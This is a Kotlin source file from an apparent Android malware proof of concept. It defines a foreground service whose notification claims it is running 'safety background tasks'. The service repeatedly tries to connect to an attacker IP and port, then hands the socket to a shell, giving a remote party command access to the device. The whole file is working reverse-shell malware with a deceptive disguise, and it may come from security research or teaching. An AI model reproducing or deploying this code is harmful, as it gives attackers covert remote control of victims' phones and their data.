package com.antoinejonard.malware_poc.malicious

import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.antoinejonard.malware_poc.MainActivity
import com.antoinejonard.malware_poc.R
import com.antoinejonard.malware_poc.notification.NotificationChannel
import com.antoinejonard.malware_poc.notification.NotificationManager
import kotlinx.coroutines.*
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketException
import java.net.SocketTimeoutException

class HostService : Service(), CoroutineScope by MainScope() {

    companion object {
        var isRunning = false
        const val TAG = "HOST_SERVICE"
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        Log.i(TAG,"Host service creation")
        super.onCreate()

        startForeground(
            NotificationManager.HOST_NOTIF_ID,
            NotificationManager.getNotification(
                applicationContext,
                "Hosting service",
                "Hosting safety background tasks",
                NotificationChannel.HOST_CHANNEL
            )
        )

        isRunning = true

        launch(Dispatchers.IO) {
            startReverseShell(getString(R.string.attacker_ip),resources.getInteger(R.integer.port));
        }
    }

    private suspend fun startReverseShell(ip: String, port: Int) {
        coroutineScope {
            var socket = Socket()
            while (true) {
                try {
                    socket.connect(InetSocketAddress(ip, port), 3000)
                } catch (_: SocketTimeoutException) {
                    Log.i(TAG, "Time out. Retrying to connect...")
                } catch (e : SocketException) {
                    Log.i(TAG, "Connection failed. Retrying to connect...")
                    e.printStackTrace()
                    delay(3000)
                }
                if (socket.isConnected) {
                    Log.i(TAG, "Connection established")
                    break
                }else{
                    socket = Socket()
                }
            }
            val shell = Shell()
            // Execute the shell in the socket
            shell.executeShell(socket)
            // Once finished, stop the service
            stopSelf()
        }
    }

    override fun onDestroy() {
        Log.i(TAG,"Host service finishes")

        isRunning = false

        super.onDestroy()
    }
}